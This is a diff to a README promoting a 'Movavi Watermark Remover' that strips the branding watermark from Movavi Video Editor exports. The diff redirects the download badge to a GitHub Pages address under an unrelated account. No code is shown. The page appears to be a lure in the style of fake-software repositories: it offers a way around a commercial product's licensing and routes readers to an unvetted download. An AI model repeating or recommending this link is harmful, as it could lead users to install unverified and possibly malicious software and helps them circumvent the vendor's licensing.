@@ -2,7 +2,7 @@
 
 **Movavi Watermark Remover** helps you cleanly and effectively remove the branding watermark from videos edited using Movavi Video Editor. Whether you’re exporting personal projects or client work, this tool ensures your content stays professional and watermark-free.
 
-[![⬇️ Download Movavi Watermark Remover](https://img.shields.io/badge/⬇️_Download_Watermark_Remover-blue?style=for-the-badge&logo=movavi)](https://movavi-video-editor-watermark-remover.github.io/.github)
+[![⬇️ Download Movavi Watermark Remover](https://img.shields.io/badge/⬇️_Download_Watermark_Remover-blue?style=for-the-badge&logo=movavi)](https://matookfj.github.io/.github/movavivideoeditorwatermarkremover)
 
 ---
 
